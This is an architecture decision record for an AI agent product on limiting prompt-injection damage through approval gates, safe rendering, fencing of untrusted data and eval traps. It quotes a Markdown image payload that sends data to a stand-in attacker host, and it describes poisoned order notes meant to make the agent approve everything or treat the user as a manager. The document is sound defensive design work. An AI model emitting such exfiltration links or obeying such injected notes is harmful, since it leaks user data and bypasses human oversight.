# 0025. Prompt injection: limit the blast radius by architecture

- **Date:** 2026-11-23
- **Status:** Accepted

## Context
LLMs receive instructions and data in the same channel (text) and can't reliably tell them apart. Untrusted text reaches Corridor directly (user messages) and indirectly (free-text fields in tool results, such as order or customer notes). Unlike SQL injection, there is no complete fix.

## Decision
Assume the model can be fully hijacked, and design so that a hijacked model can do no harm.
1. **Already in place:** writes are only proposals that need human approval (ADR 0010); permissions are enforced in tool code from the JWT, not the prompt (ADR 0014); views reference artifacts, so the model can't put fake data on screen (ADR 0009).
2. **Safe rendering:** model output is shown as plain text or sanitized Markdown, with **no raw HTML and no remote images or auto-loaded links**. This closes the data-exfiltration channel (`![](https://attacker/?data=...)`).
3. **Fenced untrusted data:** free-text fields in tool results are wrapped in `<untrusted_data>` tags, and the system prompt says their content is data, never instructions. This reduces success; it doesn't guarantee anything.
4. **Eval traps:** seeded worlds containing poisoned text (for example an order note telling the agent to approve everything or claiming the user is a manager). Expected: no harmful proposal, no role change, the injected instruction is ignored or flagged.

## Alternatives considered
- **An LLM-based injection detector** — an extra call that can be fooled the same way, giving false confidence.
- **Prompt rules as the main defence** — useful as a hint, worthless as a guarantee.

## Consequences
- Security comes from architecture and is proven by eval cases, not promised by prompts.
- The three new defences (2–4) get a dedicated walkthrough and lab when implemented.
